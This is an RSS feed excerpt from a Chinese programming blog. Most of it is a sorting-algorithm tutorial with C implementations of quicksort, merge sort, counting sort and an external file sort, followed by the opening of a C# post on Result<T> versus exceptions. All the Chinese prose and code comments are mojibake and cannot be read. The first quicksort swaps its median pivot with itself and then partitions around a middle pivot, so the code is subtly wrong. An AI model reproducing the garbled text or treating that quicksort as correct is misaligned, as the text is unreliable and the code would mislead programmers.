	//å°åºé´ä¼åï¼å¦ææååªå©å ä¸ªå¼äºï¼å¦æç»§ç»­éå½å°±ä¼æ¯è¾æµªè´¹æ¶é´äºãè¿ä¸ªæ¶åå¯ä»¥è°ç¨å¶ä»å½æ°æ¥æè¿å ä¸ªæ°
	if (right - left + 1 &lt; 10) {
		InsertSort(a + left, right - left + 1);//è¿éæ¯å¯¹a+leftä»¥åçæ°æ®è¿è¡æåºï¼æä»¥è¦å leftï¼æ³¨æ
	}
	else {
		int mid = GetMid(a, left, right);//è¿æ¯ä¸ºäºå¤çé¡ºåºçæåµï¼å¦æä½¿é¡ºåºçè¯ï¼å®ä¼ä¸æ­æåæä¸ä¸ªï¼ç¶ååå½ï¼æä»¥è¦ä½¿keyä¸è½æå¤§ä¹ä¸è½æå°
		int key = mid;
		Swap(&amp;a[key], &amp;a[mid]);
		int begin = left;
		int end = right;
		while (begin &lt; end) {
			while (begin &lt; end &amp;&amp; a[end] &gt;= a[key]) {
				end--;
			}
			while (begin &lt; end &amp;&amp; a[begin] &lt;= a[key]) {
				begin++;
			}
			Swap(&amp;a[begin], &amp;a[end]);
		}
		Swap(&amp;a[begin], &amp;a[key]);
		//åä¸ºä¸ä¸ªåºé´: [key,begin-1] begin == end [end+1,right] 
		QuickSort(a, left, begin - 1);
		QuickSort(a, end + 1, right);
	}
}
</code></pre>
</details>
<p>ééå½ç:<br>
ç¨æ æ¥æ¨¡æéå½çå®ç°:å©ç¨æ çç¹æ§(åè¿ååº)æ¥ä¿å­å·¦å³åºé´</p>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>#include "Stack.h"
//æ çå®ç°è¯¦æè¯·çä¸ä¸æ
void QuickSortNonR(int* a, int left, int right) {
	//ç¨æ æ¥ä¿å­åºé´
	ST st;
	STinit(&amp;st);
	STpush(&amp;st, right);
	STpush(&amp;st, left);
        //æ ä¸­æ²¡æåºé´äºæåä¸æ¥
	while (!STempty(&amp;st)) {
		int begin = STtop(&amp;st);
		STpop(&amp;st);
		int end = STtop(&amp;st);
		STpop(&amp;st);
		int key = QuickSort2(a,begin,end);
		//è¿éåæçæ¯[begin,key - 1] key [key + 1,end]
		if (key + 1 &lt; end) {//å°äºçæ¯end,æ¯æ¬¡é½ä¸ä¸æ ·
                        //pushæ°çå·¦å³åºé´
			STpush(&amp;st, end);
			STpush(&amp;st, key + 1);
		}
		if ((key - 1) &gt; begin) {
			STpush(&amp;st, key - 1);
			STpush(&amp;st, begin);
		}
	}
	STdes
</code></pre>
</details>
<h3 id="å¿«æçè´å½çç¹">å¿«æçè´å½çç¹:</h3>
<p><img alt="å±å¹æªå¾ 2026-01-20 195855" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120195917636-1647090227.png" class="lazyload"></p>
<p>ä»£ç å®ç°:</p>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>//å¿«æçä¸è·¯åå
void QuickSort3(int* a,int left,int right) {
	if (left &gt;= right)
		return;
	int begin = left;
	int key = a[left];
	int end = right;
	int cur = begin + 1;
	while (cur &lt;= end) {
		if (a[cur] &lt; key) {
			Swap(&amp;a[cur], &amp;a[begin]);
			cur++;
			begin++;
		}
		else if (a[cur] == key) 
			cur++;
		else {
			Swap(&amp;a[cur], &amp;a[end]);
			end--;
		}
	}
	//æ­¤æ¶åä¸ºä¸ä¸ªåºé´[left,begin-1] [begin,end] [end+1,right]
	QuickSort3(a, left, begin - 1);
	QuickSort3(a, end+1,right);
}
</code></pre>
</details>
<h2 id="å½å¹¶æåº">å½å¹¶æåº</h2>
<h3 id="æ ¸å¿ææ³-6">æ ¸å¿ææ³:</h3>
<p>æ éçäºåæ°ç»ï¼ç´å°ä¸¤ä¸¤æåº(åªæä¸ä¸ªå¼)ç¶åå¼å§å½å¹¶<br>
<img alt="å±å¹æªå¾ 2026-01-20 154555" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120154608614-1245703365.png" class="lazyload"></p>
<h3 id="ç¹ç¹-6">ç¹ç¹:</h3>
<p>ç¨³å®æåºï¼æ¶é´å¤æåº¦ä¸ºO(N*logN)ï¼ç©ºé´å¤æåº¦ä¸ºO(N)</p>
<h3 id="éç¨åºæ¯-7">éç¨åºæ¯:</h3>
<p>éè¦ç¨³å®æåºï¼æ°æ®éè¾å¤§ï¼ææ°æ®å­å¨å¨å¤é¨å­å¨å¨ä¸­</p>
<h3 id="æ¶é´å¤æåº¦-6">æ¶é´å¤æåº¦:</h3>
<p>ç±äºå®åºæ¬ä¸æ¯ååæ°ç»ï¼æ¯å®å¨äºåæ ï¼éå½æ·±åº¦ä¸ºlogNå±ï¼æ¯å±é½éè¦éåä¸è¾¹ï¼æ¶é´ä¸ºO(N)ï¼ææ¶é´å¤æåº¦ä¸ºO(N*logN)</p>
<h3 id="ä»£ç å®ç°-6">ä»£ç å®ç°:</h3>
<p>éå½ç:</p>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void _MergeSort(int* a, int* tmp, int left, int right) {
	//å½åªæä¸ä¸ªå¼äºå°±æåºäº
	if (left &gt;= right) {
		return;
	}
	int mid = (left + right) / 2;
        //æ³¨æ:è¿ééåºé´æåï¼åªè½è¿ä¹é
	int begin1 = left, end1 = mid;
	int begin2 = mid + 1, end2 = right;
	_MergeSort(a, tmp, begin1, end1);
	_MergeSort(a, tmp, begin2, end2);
	//å½ä¸¤ä¸ªæ°ç»æåºçæ¶å
	int i = begin1;//æ¯æ¬¡çiæ¯ä»begin1å¼å§ç
	//åªè¦æä¸ä¸ªèµ°å®äºå°±ç»æäº
	while (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {
		if (a[begin1] &lt; a[begin2]) {
			tmp[i++] = a[begin1++];
		}
		else {
			tmp[i++] = a[begin2++];
		}
	}
	while (begin2 &lt;= end2) {//è¦åç­å·ï¼å¦ååå¼ä¼æ¼æ
		tmp[i++] = a[begin2++];
	}
	while (begin1 &lt;= end1) {
		tmp[i++] = a[begin1++];
	}
	memcpy(a + left, tmp + left, sizeof(int) * (right - left + 1));//å½å¹¶å®äºè¦æ·è´åå»,æ¯æ¬¡èµ·ç¹ä¸ä¸æ ·
}
void MergeSort(int* a, int size) {
	int* tmp = (int*)malloc(sizeof(int) * size);
	if (tmp == NULL) {
		perror("malloc fail");
		return;
	}//æ¯æ¬¡mallocå®é½è¦æ£éªï¼å¦æä¸å¼å­å½æ°ï¼æ¯æ¬¡éå½çæ¶åé½ä¼mallocä¸ä¸ªæ°ç»ï¼æµªè´¹ç©ºé´
	_MergeSort(a, tmp, 0,size - 1);

	free(tmp);
	tmp = NULL;
}

</code></pre>
</details>
éåºé´æ¶çå:
<p><img alt="å±å¹æªå¾ 2026-01-20 155743" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120155755263-165923244.png" class="lazyload"><br>
ééå½ç:</p>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void MergeSortNonR(int* a, int size) {
	int* tmp = (int*)malloc(sizeof(int) * size);
	if (tmp == NULL) {
		perror("malloc fail");
		return;
	}//æ¯æ¬¡mallocå®é½è¦æ£éª
	int gap = 1;//gapæ¯æ¯ç»çä¸ªæ°ï¼ä»ä¸ä¸ªå¼å§ï¼å ä¸ºåªæä¸ä¸ªè¯å®æåº
	while (gap &lt; size) {
		int j = 0;
		//ä»ä¸ ä¸å¼å§æï¼ç¶åè¿æ¸¡å°ä¸¤ä¸¤å¼å§ï¼æ¯ç±gapæ¥æ§å¶ç
		for (int i = 0; i &lt; size; i += 2 * gap) {
			int begin1 = i, end1 = i + gap - 1;
			int begin2 = i + gap, end2 = i + 2 * gap - 1;
			//å ä¸ºæ­¤æ¶åªæ[begin1,end1]å·²ç»æ¯æåºäº,ä¸éè¦åå½å¹¶äº
			if (begin2 &gt;= size)
				break;
			//å¤çend2è¶ççé®é¢ï¼åæend2æ¹æsize-1åå½å¹¶ï¼è¿æ ·å°±åæäº[begin1,end1]ä¸[begin2,size-1]çå½å¹¶
			if (end2 &gt;= size)
				end2 = size - 1;
			//åªè¦æä¸ä¸ªèµ°å®äºå°±ç»æäº
			while (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {
				if (a[begin1] &lt; a[begin2]) {
					tmp[j++] = a[begin1++];
				}
				else {
					tmp[j++] = a[begin2++];
				}
			}
			while (begin2 &lt;= end2) {//è¦åç­å·ï¼å¦ååå¼ä¼æ¼æ
				tmp[j++] = a[begin2++];
			}
			while (begin1 &lt;= end1) {
				tmp[j++] = a[begin1++];
			}
			//éè¦ä¸æ®µä¸æ®µæ·è´ï¼åå :å½begin2 &gt;= sizeçæ¶åæ­¤æ¶çend2å·²ç»è¶åºsize-1äºæ·è´çæ°éå°±ä¸å¯¹äº
			memcpy(a + i, tmp + i, sizeof(int) * (end2 - i + 1));
		}
		printf("\n");
		gap *= 2;
	}
	free(tmp);
	tmp = NULL;
}
</code></pre>
</details>
ä»£ç å®ç°ä¸­çå:
<p><img alt="å±å¹æªå¾ 2026-01-20 161642" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3758708/202601/3758708-20260120161656430-380367198.png" class="lazyload"></p>
<h2 id="è®¡æ°æåº">è®¡æ°æåº</h2>
<h3 id="æ ¸å¿ææ³-7">æ ¸å¿ææ³:</h3>
<p>æ°å¼ä¸ä¸ªæ°ç»ï¼ç¨æ°æ°ç»çä¸æ æ¥è¡¨ç¤ºåæ°ç»çæ°æ®ï¼éåä¸éåæ°ç»ï¼æ¯éå°åæ°ç»ä¸­çæ°æ®ï¼æ°æ°ç»å¯¹åºçä¸æ çå¼å°±++ï¼ç¶ååéåä¸è¾¹æ°æ°ç»ï¼ææ°æ°ç»çå¼æ·è´ååæ°ç»</p>
<h3 id="ç¹ç¹-7">ç¹ç¹:</h3>
<p>éæ¯è¾æåºï¼æ¶é´å¤æåº¦ä¸ºO(N + range)ï¼ç©ºé´å¤æåº¦ä¸ºO(N)</p>
<h3 id="éç¨åºæ¯-8">éç¨åºæ¯:</h3>
<p>æ°æ®ç±»åéä¸­ï¼æ°å¼èå´è¿å°äºæ°æ®é(æ­¤æ¶æ¶é´å¤æåº¦ä¸ºO(N))</p>
<h3 id="æ¶é´å¤æåº¦-7">æ¶é´å¤æåº¦:</h3>
<p>ä¸¤æ¬¡éåï¼åå«ä¸ºO(N),O(range)ï¼ææ¶é´å¤æåº¦ä¸ºO(N+range)</p>
<h3 id="ä»£ç å®ç°-7">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>void CountSort(int* a, int size) {
	//åéåä¸éæ¾å°æå°å¼åæå¤§å¼(ç¸å¯¹æ å°)
	int mini = a[0], maxi = a[0];
	for (int i = 0; i &lt; size; i++) {
		if (a[i] &lt; mini)
			mini = a[i];
		if (a[i] &gt; maxi)
			maxi = a[i];
	}
	int range = maxi - mini + 1;
	//callocèªå¨åå§åä¸º0
	//å¦æç¨mallocéè¦ç¨memsetæå¨åå§åä¸º0
	int* tmp = (int*)calloc(range,sizeof(int));
	if (tmp == NULL) {
		perror("calloc fail");
		return;
	}
	//æ¾å¥tmpä¸æ ä¸­
	for (int i = 0; i &lt; size; i++) {
		//ç¸å¯¹æ å°ï¼è¥ç´æ¥æ å°ä¼æµªè´¹å¤ªå¤ç©ºé´
		tmp[a[i] - mini]++;
	}
	//æ·è´ååæ°ç»
	int j = 0;
	for (int i = 0; i &lt; range; i++) {
		while (tmp[i]--) {
			a[j++] = i + mini;
		}
	}
	free(tmp);
	tmp = NULL;
}
</code></pre>
</details>
ç¸å¯¹æ å°:
åéååºåæ°ç»çæå¤§å¼ä¸æå°å¼ï¼ä»èå³å®æ°æ°ç»çå¤§å°ï¼åæ°ç»çæ°æ®-minå¼å°±æ¯æ°æ°ç»å¯¹åºçä¸æ 
<h2 id="å½å¹¶æåºçå¤æåº">å½å¹¶æåºçå¤æåº</h2>
<h3 id="éå½å¹¶çåå ">éå½å¹¶çåå :</h3>
<p>å ä¸ºå¶ä»çæåºé½æ¯ç¨æ°ç»å­å¨æ°æ®ï¼è¦ç¨ä¸æ å»è®¿é®æ°æ®ï¼ä½å¨ç£çæä»¶ä¸­ä¸æ¹ä¾¿è®¿é®ï¼éè¦è¯»åæä»¶æ¥è®¿é®ï¼éåº¦ææ¢</p>
<h3 id="æ ¸å¿æè·¯">æ ¸å¿æè·¯:</h3>
<p>å°ä¸ä¸ªå¤§æä»¶çæ°æ®æ¾å°file1åfile2ä¸¤ä¸ªå°æä»¶ä¸­å»ï¼å¹¶ç¨æåºç®æ³æææåºï¼ç¶åç¨å½å¹¶ç®æ³å°file1åfile2åææåºçå¤§æä»¶mfileï¼å é¤file1åfile2ï¼å°mfileæ¹åä¸ºfile1ï¼ç¶åç»§ç»­è¯»æä»¶å°file2ä¸­ï¼ç»§ç»­å½å¹¶â¦â¦</p>
<h3 id="ä»£ç å®ç°-8">ä»£ç å®ç°:</h3>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>//æä»¶çå¤æåº(ç¨å½å¹¶æåºå®ç°)

//è®¾ç½®éæºçæ°
void FileSet() {
	const char* filename = "data.txt";
	FILE* file = fopen(filename, "w");
	if (file == NULL) {
		perror("fopen fail");
		return;
	}
	//åå¥éæºæ°æ®
	int size = 1000000;
	for (int i = 0; i &lt; size; i++) {
		fprintf(file, "%d\n", rand() + i);
	}
	fclose(file);
}

//ææä»¶ä¸­çæ°è¯»å¥æ°æä»¶ä¸­ï¼å¹¶æåº
//è¿åå®éè¯»å°çæ°æ®ä¸ªæ°
int ReadNDataSortToFile(FILE* file, int n, const char* name) {
	//è¦æ¯æ¯æ¬¡é½æå¼æä»¶çè¯æä»¶æéåä¼éå¤´å¼å§äº,æä»¥è¦æåæå¼
	FILE* file1 = fopen(name, "w");
	if (file1 == NULL) {
		perror("fopen fail");
		return 0;
	}
	//æåæä»¶è¯»å¥ä¸´æ¶çæ°ç»ä¸­
	int* a = (int*)calloc(n, sizeof(int));
	if (a == NULL) {
		perror("calloc fail");
		return 0;
	}
	int index = 0;//å ä¸ºæ­¤æ¶ä¸ä¸å®è½è¯»æ»¡nä¸ª
	int x = 0;
	for (int i = 0; i &lt; n; i++) {
		if (fscanf(file, "%d", &amp;x)==EOF)
			break;
		a[index++] = x;//indexæ­¤æ¶æ¯ä¸ªæ°
	}
	if (index == 0) {
		free(a);
		a = NULL;//ä¸å®è¦freeæï¼ä¸ç¶ä¼åå­æ³é²
		return 0;
	}
	//å°æ°ç»aæåº
	QuickSortNonR(a, 0, index-1);//ä»»ææåºåå¯
	//ç¶åææ°ç»ä¸­çå¼åå¥file1ä¸­
	for (int i = 0; i &lt; index; i++) {
		fprintf(file1, "%d\n", a[i]);
	}
	fclose(file1);
	free(a);
	a = NULL;
	return index;
}

//å°ä¸¤ä¸ªæåºçæä»¶å½å¹¶å¨ä¸èµ·
void MergeSortToFile(const char* file1name, const char* file2name,const char* mfilename) {
	FILE* file1 = fopen(file1name, "r");
	if (file1 == NULL) {
		perror("fopen fail");
		return;
	}FILE* file2 = fopen(file2name, "r");
	if (file2 == NULL) {
		perror("fopen fail");
		return;
	}
	FILE* mfile = fopen(mfilename, "w");
	if (mfile == NULL) {
		perror("fopen fail");
		return;
	}
	//å°file1åfile2å½å¹¶å¨ä¸èµ·
	int x1;
	int x2;
	int ret1 = fscanf(file1, "%d", &amp;x1);
	int ret2 = fscanf(file2, "%d", &amp;x2);
	while (ret1 !=EOF &amp;&amp; ret2!=EOF) {//è¿éçret1året2è¦æ´æ°
		if (x1&lt;x2) {
			fprintf(mfile, "%d\n", x1);//è¦å æ¢è¡
			ret1 = fscanf(file1, "%d", &amp;x1);
		}
		else {
			fprintf(mfile, "%d\n", x2);
			ret2 = fscanf(file2, "%d", &amp;x2);
		}
	}
	while (ret1 != EOF) {
		fprintf(mfile, "%d\n", x1);
		ret1 = fscanf(file1, "%d", &amp;x1);
	}
	while (ret2!= EOF) {
		fprintf(mfile, "%d\n", x2);
		ret2 = fscanf(file2, "%d", &amp;x2);
	}
	fclose(file1);
	fclose(file2);
	fclose(mfile);
}

void FileTest() {
	srand((unsigned int)time(NULL));
	FileSet();
	const char* filename = "data.txt";
	FILE* file = fopen(filename, "r");
	if (file == NULL) {
		perror("fopen fail");
		return;
	}
	//å°è¿æä»¶çæ°æ®åå¥file1åfile2ä¸­ï¼åå«æåºï¼ç¶åå½å¹¶å¨ä¸èµ·
	const char* file1 = "file1.txt";
	const char* file2 = "file2.txt";
	const char* mfile = "mfile.txt";
	int m = 100000;//æ¯æ¬¡è¯»å¥çæ°æ®ä¸ªæ°
	ReadNDataSortToFile(file, m, file1);
	ReadNDataSortToFile(file, m, file2);
	while (1) {
		//å°file1åfile2å½å¹¶å¨ä¸èµ·
		MergeSortToFile(file1, file2, mfile);
		//å½å¹¶å¨ä¸èµ·åå é¤file1åfile2
		remove(file1);
		remove(file2);
		//åå°mfileåå­æ¹æfile1,å¾ªç¯æä½
		rename(mfile, file1);
		if (ReadNDataSortToFile(file, m, file2) == 0)
			break;
	}
	fclose(file);
}
</code></pre>
</details>
<h2 id="æåºæµè¯">æåºæµè¯</h2>
<details>
<summary>ç¹å»æ¥çä»£ç </summary>
<pre><code>#include"Sort.h"

void SortTest() {
	srand((unsigned int)time(NULL));
	int N = 10000000;
	int* a1 = (int*)malloc(N * sizeof(int));
	int* a2 = (int*)malloc(N * sizeof(int));
	int* a3 = (int*)malloc(N * sizeof(int));
	int* a4 = (int*)malloc(N * sizeof(int));
	int* a5 = (int*)malloc(N * sizeof(int));
	int* a6 = (int*)malloc(N * sizeof(int));
	int* a7 = (int*)malloc(N * sizeof(int));
	int* a8 = (int*)malloc(N * sizeof(int));
	for (int i = 0; i &lt; N; i++) {
		a1[i] = rand() + i+100;
		a2[i] = a1[i];
		a3[i] = a1[i];
		a4[i] = a1[i];
		a5[i] = a1[i];
		a6[i] = a1[i];
		a7[i] = a1[i];
		a8[i] = a1[i];
	}

	//åæ³¡æåº
	int begin = clock();
	BubbleSort(a1, N);
	int end = clock();
	printf("BubbleSort:%d\n", end - begin);

	//å æåº
	begin = clock();
	HeapSort(a2,N);
	end = clock();
	printf("HeapSort:%d\n", end - begin);

	//æå¥æåº
	begin = clock();
	InsertSort(a3,N);
	end = clock();
	printf("InsertSort:%d\n", end - begin);

	//å¸å°æåº
	begin = clock();
	ShellSort(a4, N);
	end = clock();
	printf("ShellSort:%d\n", end - begin);

	//éæ©æåº
	begin = clock();
	SelectSort(a5, N);
	end = clock();
	printf("SelectSort:%d\n", end - begin);

	//å¿«æ
	begin = clock();
	QuickSort(a6, 0,N-1);
	end = clock();
	printf("QuickSort:%d\n", end - begin);

	//å½å¹¶æåº
	begin = clock();
	MergeSort(a7, N);
	end = clock();
	printf("MergeSort:%d\n", end - begin);

	//è®¡æ°æåº
	begin = clock();
	CountSort(a8, N);
	end = clock();
	printf("CountSort:%d\n", end - begin);

	//éªè¯æ¯å¦ææ­£ç¡®
	int Flag = 1;
	for (int i = 0; i &lt; N; i++) {
		if (a8[i] != a7[i])
			Flag = 0;
	}
	if (Flag == 1) {
		printf("è®¡æ°æåºæ­£ç¡®\n");
	}
	else {
		printf("è®¡æ°æåºéè¯¯\n");
	}
}
</code></pre>
</details>
<h1 id="ä¸æ»ç»">ä¸ãæ»ç»</h1>
<p>æ°æ®éå°å?-&gt;æå¥æåº<br>
éè¦ç¨³å®æåº?-&gt;å½å¹¶æåº/è®¡æ°æåº<br>
æ°æ®å¨ç£çè¿æ¯å¨åå­?-&gt;ç£çéæ©å½å¹¶ï¼åå­éå¿«æ<br>
åå­èµæºç´§å¼ å?-&gt;åå°æåº(å¿«æ/å¸å°/å æ)</p>
<h3 id="æ²¡ææå¥½çæåºç®æ³åªææéåçæåºç®æ³">æ²¡ææå¥½çæåºç®æ³ï¼åªææéåçæåºç®æ³</h3>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 20:19">2026-01-20 20:19</span>&nbsp;
<a href="https://www.cnblogs.com/niukwuy">æ¨é´</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19507074);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19507074', targetLink: 'https://www.cnblogs.com/niukwuy/p/19507074/sort-algorithms-full-guide', title: 'ãæåºç®æ³å¨è§£æï¼ä»åºç¡å°ä¼åï¼ä¸æåéå«å¤§æåºï¼ã' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åå« throw exceptionï¼ä¸ºä»ä¹ Result<T> ææ¯ä¸å¡é»è¾çæ­£ç¡®éæ© ]]></title>
    <link>https://www.cnblogs.com/diamondhusky/p/19508626</link>
    <guid>5b146f83f56da1052f4440a052407726</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/diamondhusky/p/19508626" title="åå¸äº 2026-01-20 19:40">
    <span role="heading" aria-level="2">åå« throw exceptionï¼ä¸ºä»ä¹ Result&lt;T&gt; ææ¯ä¸å¡é»è¾çæ­£ç¡®éæ©</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#å¼è¨ä¸ä¸ªæ®éå­å¨çåå³é" rel="noopener nofollow">å¼è¨ï¼ä¸ä¸ªæ®éå­å¨çâåå³éâ</a></li><li><a href="#ä¸å¼å¸¸çåç½ª--æä»¬ä¸ç´å¨æ»¥ç¨å®" rel="noopener nofollow">ä¸ãå¼å¸¸çâåç½ªâ ââ æä»¬ä¸ç´å¨æ»¥ç¨å®</a><ul><li><a href="#11-å¼å¸¸çæ¬è´¨æ¯ä»ä¹" rel="noopener nofollow">1.1 å¼å¸¸çæ¬è´¨æ¯ä»ä¹ï¼</a></li><li><a href="#12-ä¸å¡é»è¾--å¼å¸¸æåµ" rel="noopener nofollow">1.2 ä¸å¡é»è¾ â  å¼å¸¸æåµ</a></li></ul></li><li><a href="#äºresultä¸å¡é»è¾çä¼ééçº§" rel="noopener nofollow">äºãResult<t>ââä¸å¡é»è¾ç"ä¼ééçº§"</t></a><ul><li><a href="#21-ä»ä¹æ¯result" rel="noopener nofollow">2.1 ä»ä¹æ¯Result<t>ï¼</t></a></li><li><a href="#22-å¦ä½æ­£ç¡®ä½¿ç¨result" rel="noopener nofollow">2.2 å¦ä½æ­£ç¡®ä½¿ç¨Result<t>ï¼</t></a></li></ul></li><li><a href="#ä¸æ§è½å¯¹å³--å è¿ç¢¾åçæ§è½å·®è·" rel="noopener nofollow">ä¸ãæ§è½å¯¹å³ ââ å è¿ç¢¾åçæ§è½å·®è·</a><ul><li><a href="#31-é¨åæµè¯ä»£ç " rel="noopener nofollow">3.1 é¨åæµè¯ä»£ç </a></li><li><a href="#32-æµè¯ç»æè§¦ç®æå¿" rel="noopener nofollow">3.2 æµè¯ç»æï¼è§¦ç®æå¿</a></li><li><a href="#33-å¹¶ååºæ¯ä¸æ§è½å·®è·ä¾æ§ä¸å¿ç´è§" rel="noopener nofollow">3.3 å¹¶ååºæ¯ä¸ï¼æ§è½å·®è·ä¾æ§ä¸å¿ç´è§</a></li></ul></li><li><a href="#åä¸ºä»ä¹å¼å¸¸å¨ä¸å¡åºæ¯ä¸å¦æ­¤æè´µ" rel="noopener nofollow">åãä¸ºä»ä¹å¼å¸¸å¨ä¸å¡åºæ¯ä¸å¦æ­¤"æè´µ"ï¼</a><ul><li><a href="#41-clrå¼å¸¸æºå¶çåºå±åç" rel="noopener nofollow">4.1 CLRå¼å¸¸æºå¶çåºå±åç</a><ul><li><a href="#411-å¼å¸¸å¯¹è±¡çæé è¿ç¨" rel="noopener nofollow">4.1.1 å¼å¸¸å¯¹è±¡çæé è¿ç¨</a></li><li><a href="#412-å æ è·è¸ªççå®ä»£ä»·" rel="noopener nofollow">4.1.2 å æ è·è¸ªççå®ä»£ä»·</a></li><li><a href="#413-jitåaotç¼è¯å¯¹å¼å¸¸çå½±å" rel="noopener nofollow">4.1.3 JITåAOTç¼è¯å¯¹å¼å¸¸çå½±å</a></li></ul></li><li><a href="#42-å¼å¸¸å¤ççåå­åéç»è" rel="noopener nofollow">4.2 å¼å¸¸å¤ççåå­åéç»è</a><ul><li><a href="#421-å¼å¸¸å¯¹è±¡çåå­å¸å±" rel="noopener nofollow">4.2.1 å¼å¸¸å¯¹è±¡çåå­å¸å±</a></li><li><a href="#422-gcçå½±å" rel="noopener nofollow">4.2.2 GCçå½±å</a></li></ul></li><li><a href="#43-cpuçº§å«çæ§è½å½±å" rel="noopener nofollow">4.3 CPUçº§å«çæ§è½å½±å</a><ul><li><a href="#431-ç°ä»£cpuçå¼å¸¸å¤çå¼é" rel="noopener nofollow">4.3.1 ç°ä»£CPUçå¼å¸¸å¤çå¼é</a></li><li><a href="#432-å¯¹æ¯æ­£å¸¸è¿ååå¼å¸¸è¿å" rel="noopener nofollow">4.3.2 å¯¹æ¯æ­£å¸¸è¿ååå¼å¸¸è¿å</a></li></ul></li><li><a href="#44-å¯¹æ¯å¶ä»ç¼ç¨è¯­è¨" rel="noopener nofollow">4.4 å¯¹æ¯å¶ä»ç¼ç¨è¯­è¨</a><ul><li><a href="#441-javaçå¼å¸¸æºå¶" rel="noopener nofollow">4.4.1 Javaçå¼å¸¸æºå¶</a></li><li><a href="#442-goçéè¯¯å¤çå²å­¦" rel="noopener nofollow">4.4.2 Goçéè¯¯å¤çå²å­¦</a></li><li><a href="#443-rustçresultç±»å" rel="noopener nofollow">4.4.3 RustçResultç±»å</a></li><li><a href="#444-cçéè¯¯å¤ç" rel="noopener nofollow">4.4.4 C++çéè¯¯å¤ç</a></li></ul></li><li><a href="#45-net-coreçæ¹è¿åå±é" rel="noopener nofollow">4.5 .NET Coreçæ¹è¿åå±é</a></li></ul></li><li><a href="#äºresultçè¿é¶ä¼å¿" rel="noopener nofollow">äºãResult<t>çè¿é¶ä¼å¿</t></a><ul><li><a href="#51-ä¸°å¯çéè¯¯ä¿¡æ¯" rel="noopener nofollow">5.1 ä¸°å¯çéè¯¯ä¿¡æ¯</a></li><li><a href="#52-å½æ°å¼ç¼ç¨æ¯æ" rel="noopener nofollow">5.2 å½æ°å¼ç¼ç¨æ¯æ</a></li><li><a href="#53-æ´å¥½çapiè®¾è®¡" rel="noopener nofollow">5.3 æ´å¥½çAPIè®¾è®¡</a></li></ul></li><li><a href="#å­-resultæ¨¡å¼çä¸äºå¼ç«¯" rel="noopener nofollow">å­ã Result<t>æ¨¡å¼çä¸äºå¼ç«¯</t></a><ul><li><a href="#61-ifå°ç±é®é¢æ¡ä»¶å¤æ­æ³æ»¥" rel="noopener nofollow">6.1 "ifå°ç±"é®é¢ï¼æ¡ä»¶å¤æ­æ³æ»¥ï¼</a></li><li><a href="#62-å¼ç±»åstructvs-å¼ç¨ç±»åclassçä¸¤é¾éæ©" rel="noopener nofollow">6.2 å¼ç±»åï¼structï¼vs å¼ç¨ç±»åï¼classï¼çä¸¤é¾éæ©</a></li><li><a href="#63-å¼æ­¥ç¼ç¨çå¤ææ§" rel="noopener nofollow">6.3 å¼æ­¥ç¼ç¨çå¤ææ§</a></li><li><a href="#64-ç±»åç³»ç»åé¿" rel="noopener nofollow">6.4 ç±»åç³»ç»åé¿</a></li><li><a href="#65-å¶ä»é®é¢" rel="noopener nofollow">6.5 å¶ä»é®é¢</a></li></ul></li><li><a href="#ä¸å¸¸è§é®é¢ä¸ç­ç" rel="noopener nofollow">ä¸ãå¸¸è§é®é¢ä¸ç­ç</a></li><li><a href="#å«æ»ç»" rel="noopener nofollow">å«ãæ»ç»</a></li></ul></div><p></p>
<h1 id="å¼è¨ä¸ä¸ªæ®éå­å¨çåå³é">å¼è¨ï¼ä¸ä¸ªæ®éå­å¨çâåå³éâ</h1>
<p>å¦æä½ å¨C#é¡¹ç®ä¸­çå°è¿æ ·çä»£ç ï¼ä¸å®ä¸ä¼æå°éçï¼</p>
<pre><code class="language-csharp">public User Login(string username, string password)
{
    var user = FindUser(username);
    if (user == null)
        throw new Exception("ç¨æ·ä¸å­å¨");  // â çæçæ¨¡å¼
    
    if (!VerifyPassword(user, password))
        throw new Exception("å¯ç éè¯¯");    // â å¦ä¸ä¸ªçæçæ¨¡å¼
    
    return user;
}
</code></pre>
<p>è¿ç§ä½¿ç¨å¼å¸¸æ¥å¤çä¸å¡é»è¾çåæ³ï¼å ä¹æäºC#å¼åçâæ åèå¼âã<br>
å¯æ¯ï¼<strong>ä»æ¥å¦æ­¤ï¼ä¾¿æ¯å¯¹çä¹ï¼</strong></p>
<h1 id="ä¸å¼å¸¸çåç½ª--æä»¬ä¸ç´å¨æ»¥ç¨å®">ä¸ãå¼å¸¸çâåç½ªâ ââ æä»¬ä¸ç´å¨æ»¥ç¨å®</h1>
<h2 id="11-å¼å¸¸çæ¬è´¨æ¯ä»ä¹">1.1 å¼å¸¸çæ¬è´¨æ¯ä»ä¹ï¼</h2>
<p>é¦åï¼æä»¬è¦æç½C#è¯­è¨éçå¼å¸¸ï¼Exceptionï¼çè®¾è®¡åè¡·ï¼</p>
<pre><code class="language-csharp">// è¿äºææ¯å¼å¸¸çæ­£çä½¿ç¨åºæ¯ï¼
public void ReadFile(string path)
{
